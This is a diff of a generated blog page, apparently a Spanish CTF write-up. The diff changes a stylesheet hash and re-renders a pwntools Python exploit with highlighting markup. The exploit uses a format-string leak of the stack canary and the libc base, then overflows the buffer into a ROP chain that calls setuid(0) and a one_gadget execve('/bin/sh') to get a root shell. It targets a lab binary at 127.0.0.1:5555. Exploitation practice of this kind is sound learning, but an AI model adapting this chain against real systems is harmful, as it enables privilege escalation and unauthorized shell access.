@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -361,98 +361,98 @@ remoto!</p>
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>#!/usr/bin/env python2
-import sys
-from pwn import *
-context.update(arch="amd64", endian="little", os="linux",
-               terminal=["gnome-terminal", "new window"],)
-LOCAL, REMOTE = False, False
-TARGET=os.path.realpath("2501")
-e = ELF(TARGET)
-l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-#ejecutar python exploit.py remote (para tomar el proceso en escucha)
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"little"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">,</span>
+               <span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">"gnome-terminal"</span><span class="p">,</span> <span class="s">"new window"</span><span class="p">],)</span>
+<span class="n">LOCAL</span><span class="p">,</span> <span class="n">REMOTE</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span>
+<span class="n">TARGET</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="s">"2501"</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
+<span class="c1">#ejecutar python exploit.py remote (para tomar el proceso en escucha)
 #la cuarta direccion que se lekea nos da un offset para calcular libc base
-#&gt;&gt;&gt; offset = 0x7ffff7ff2440 - 0x7ffff7a3a000
-#&gt;&gt;&gt; print hex(offset)
+#&amp;gt;&amp;gt;&amp;gt; offset = 0x7ffff7ff2440 - 0x7ffff7a3a000
+#&amp;gt;&amp;gt;&amp;gt; print hex(offset)
 #0x5b8440
-#&gt;&gt;&gt; 
-offset = 0x1c2500 # de R9 que parece estar en libc
+#&amp;gt;&amp;gt;&amp;gt; 
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1c2500</span> <span class="c1"># de R9 que parece estar en libc
 #calculamos este gadget con one_gadget (vaya herramienta)
-gadget = 0x4484f   #excev(/bin/sh)
-setuid = l.symbols['setuid'] # no necesita explicacion
-pop_rdi = 0x23a5f #pop rdi ret en libc (por que no?)
-
-#funcion para calcular el canary... no mucho que explicar
-def offset_canary(): 
-    for i in range(1, 200):
-        r = process([TARGET,])
-        test = "aaa"
-        pattern = "A" * i
-        r.sendlineafter("Name: ", test)
-        r.readuntil('Code:')
-        r.sendline(pattern)
-        response = r.recvall()
+</span><span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x4484f</span>   <span class="c1">#excev(/bin/sh)
+</span><span class="n">setuid</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span> <span class="c1"># no necesita explicacion
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x23a5f</span> <span class="c1">#pop rdi ret en libc (por que no?)
+</span>
+<span class="c1">#funcion para calcular el canary... no mucho que explicar
+</span><span class="k">def</span> <span class="nf">offset_canary</span><span class="p">():</span> 
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">200</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,])</span>
+        <span class="n">test</span> <span class="o">=</span> <span class="s">"aaa"</span>
+        <span class="n">pattern</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">i</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">,</span> <span class="n">test</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">'Code:'</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">()</span>
         
-        if "stack smashing detected" in response:
-            print "CANARY empieza en ", i
-            r.close()
-            break
-        else:
-            print "NAAAAAA siga particopando "
-            r.close()
+        <span class="k">if</span> <span class="s">"stack smashing detected"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">"CANARY empieza en "</span><span class="p">,</span> <span class="n">i</span>
+            <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">"NAAAAAA siga particopando "</span>
+            <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
-#con esta funcion descrubrimos el offset en canary + 8 bytes (cae en RSP)
-def offset_ret(r):
-    #r = process([TARGET,])
-    test = "%lx-" * 15
-    r.sendlineafter("Name: ", test)
-    response = r.readuntil('Code:')
-    response = response.split('-')
-    canary = int(response[-2],16)
-    print hex(canary)
-    pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII" #encontrado 8 mas (donde empiezan las C)
-    payload = "A" * 136 + p64(canary) + pattern
+<span class="c1">#con esta funcion descrubrimos el offset en canary + 8 bytes (cae en RSP)
+</span><span class="k">def</span> <span class="nf">offset_ret</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="c1">#r = process([TARGET,])
+</span>    <span class="n">test</span> <span class="o">=</span> <span class="s">"%lx-"</span> <span class="o">*</span> <span class="mi">15</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">,</span> <span class="n">test</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">'Code:'</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="s">"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"</span> <span class="c1">#encontrado 8 mas (donde empiezan las C)
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">pattern</span>
 
-    r.sendline(payload)
-    #resp = r.recvall()
-    r.interactive()
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c1">#resp = r.recvall()
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
-def exploit(r):
-    payload = "%lx-" * 15
-    r.sendlineafter("Name: ", payload)
-    response = r.readuntil('Code:')
-    response = response.split('-')
-    print "format strings shits : ", response
-    canary = int(response[-2],16)
-    print hex(canary)
-    libc = int(response[3],16) - offset
-    print hex(libc)
-    payload = "A" * 136
-    payload += p64(canary)
-    payload += "B" * 8 #junk hasta ret 
-    payload += p64(libc + pop_rdi)
-    payload += p64(0x0)  #null para setuid
-    payload += p64(libc + setuid) #si vamos a usar esta tecnica ojo con la prueba local
-    payload += p64(libc + gadget) #super gadget
-    r.sendline(payload)
-    r.interactive()
-    return
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"%lx-"</span> <span class="o">*</span> <span class="mi">15</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Name: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">'Code:'</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"format strings shits : "</span><span class="p">,</span> <span class="n">response</span>
+    <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">offset</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span> <span class="c1">#junk hasta ret 
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>  <span class="c1">#null para setuid
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">setuid</span><span class="p">)</span> <span class="c1">#si vamos a usar esta tecnica ojo con la prueba local
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">gadget</span><span class="p">)</span> <span class="c1">#super gadget
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="k">return</span>
 
-if __name__ == "__main__":
-    if len(sys.argv)==2 and sys.argv[1]=="remote":
-        REMOTE = True
-        r = remote("127.0.0.1", 5555)
-    else:
-        LOCAL = True
-        r = process([TARGET,])
-        print "PID para debug"
-    print util.proc.pidof(r) #solo para atachar a GDB soy flojo
-        #pause() #ermm
-    exploit(r)
-    #offset_canary()
-   #offset_ret(r)
-    sys.exit(0)
-</code></pre>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">==</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s">"remote"</span><span class="p">:</span>
+        <span class="n">REMOTE</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">TARGET</span><span class="p">,])</span>
+        <span class="k">print</span> <span class="s">"PID para debug"</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="c1">#solo para atachar a GDB soy flojo
+</span>        <span class="c1">#pause() #ermm
+</span>    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="c1">#offset_canary()
+</span>   <span class="c1">#offset_ret(r)
+</span>    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
 <!-- /wp:code -->
 
                 </section>
